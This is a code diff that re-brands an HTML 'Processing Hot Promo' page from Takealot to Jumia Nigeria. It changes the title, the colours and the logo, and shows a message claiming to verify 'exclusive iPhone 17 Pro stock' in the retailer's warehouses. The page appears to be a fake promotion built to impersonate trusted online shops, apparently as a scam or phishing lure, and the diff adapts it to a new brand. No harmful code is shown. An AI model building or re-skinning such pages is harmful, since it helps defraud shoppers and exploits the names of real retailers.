@@ -4,17 +4,17 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Takealot | Processing Hot Promo...</title>
+    <title>Jumia Nigeria | Processing Hot Promo...</title>
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;800&display=swap" rel="stylesheet">
     <style>
         :root {
-            --tk-blue: #0B79BF;
+            --tk-blue: #f68b1e;
             --tk-dark: #121212;
             --tk-grey: #4C4C4E;
             --glass: rgba(0, 0, 0, 0.03);
-            --premium-gradient: linear-gradient(135deg, #0b79bf 0%, #064d7a 100%);
+            --premium-gradient: linear-gradient(135deg, #f68b1e 0%, #d87515 100%);
         }
 
         * {
@@ -40,7 +40,7 @@
             position: absolute;
             width: 150%;
             height: 150%;
-            background: radial-gradient(circle at 50% 50%, rgba(11, 121, 191, 0.05) 0%, transparent 50%);
+            background: radial-gradient(circle at 50% 50%, rgba(246, 139, 30, 0.05) 0%, transparent 50%);
             animation: pulseBg 8s infinite alternate ease-in-out;
             z-index: 0;
         }
@@ -81,13 +81,16 @@
             padding: 1.5rem;
             border-radius: 24px;
             display: inline-block;
-            box-shadow: 0 10px 40px rgba(11, 121, 191, 0.15);
+            box-shadow: 0 10px 40px rgba(246, 139, 30, 0.15);
             animation: logoFloat 3s infinite ease-in-out;
             border: 1px solid rgba(0, 0, 0, 0.03);
         }
 
-        .logo-container img {
-            width: 160px;
+        .jumia-badge {
+            font-weight: 800;
+            color: #f68b1e;
+            font-size: 32px;
+            letter-spacing: -1px;
             display: block;
         }
 
@@ -194,14 +197,14 @@
     <div class="container">
         <div class="logo-wrapper">
             <div class="logo-container">
-                <img src="logo-takealot.svg" alt="Takealot">
+                <span class="jumia-badge">JUMIA</span>
             </div>
         </div>
 
         <div class="promo-badge">HOT PROMO</div>
 
         <h1>Processing Offer</h1>
-        <p>Verifying exclusive iPhone 17 Pro stock in Takealot warehouses...</p>
+        <p>Verifying exclusive iPhone 17 Pro stock in Jumia warehouses...</p>
 
         <div class="progress-container">
             <div class="progress-bar" id="progress"></div>
